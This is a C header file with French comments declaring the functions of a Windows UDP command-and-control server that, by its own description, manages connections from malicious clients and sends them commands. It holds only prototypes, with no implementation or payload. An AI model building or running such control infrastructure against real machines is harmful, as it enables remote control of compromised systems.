/**
 * @file server.h
 * @brief Définition des fonctions du serveur de contrôle
 * @author Valentin Pizzio
 * @date 21/12/2024
 * 
 * Ce fichier définit les fonctions du serveur de contrôle qui gère
 * les connexions des clients malveillants et leur envoie des commandes.
 */

#ifndef SERVER_H
#define SERVER_H

#include <winsock2.h>
#include <windows.h>
#include "protocol.h"

/**
 * @brief Efface l'entrée standard
 * 
 * Cette fonction efface l'entrée standard pour éviter les erreurs de saisie.
 */
void clear_stdin(void);

/**
 * @brief Initialise le serveur
 * 
 * Cette fonction initialise la bibliothèque Winsock et crée un socket UDP
 * pour écouter les connexions entrantes.
 */
void init_server(void);

/**
 * @brief Gère un client connecté
 * 
 * Cette fonction gère l'interaction avec un client connecté, notamment
 * en affichant le menu et en traitant les commandes de l'utilisateur.
 * 
 * @param socket_fd Socket de communication
 * @param client_addr Adresse du client
 * @param current_client_id Identifiant du client actuel
 */
void handle_client(SOCKET socket_fd, struct sockaddr_in client_addr, char* current_client_id);

/**
 * @brief Affiche le menu des commandes disponibles
 * 
 * Cette fonction affiche la liste des commandes que l'utilisateur
 * peut envoyer aux clients connectés.
 */
void print_menu(void);

/**
 * @brief Traite une commande de l'utilisateur
 * 
 * Cette fonction exécute la commande choisie par l'utilisateur et
 * envoie les instructions appropriées au client.
 * 
 * @param choice Choix de l'utilisateur
 * @param socket_fd Socket de communication
 * @param client_addr Adresse du client
 * @param current_client_id Identifiant du client actuel
 */
void handle_command(int choice, SOCKET socket_fd, struct sockaddr_in client_addr, char* current_client_id);

#endif // SERVER_H
